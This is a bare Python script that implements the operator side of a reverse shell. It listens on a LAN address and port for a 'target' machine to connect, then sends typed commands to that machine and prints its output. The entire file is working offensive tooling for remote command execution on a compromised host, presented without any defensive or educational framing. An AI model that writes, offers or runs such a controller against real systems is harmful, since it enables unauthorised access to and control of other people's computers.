                                                       
#!/usr/bin/python
import socket

def shell():
    while True:
        command = input("* Shell#~#%s: " % str(ip))
        target.send(command.encode())
        if command == "q":
            break
        else:
            answer = target.recv(1024)
            print(answer.decode())

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.226.130", 54321))
    s.listen(5)
    print("Listening for Incoming connection")
    target, ip = s.accept()
    print("Target Connected!")

server()
shell()
s.close()

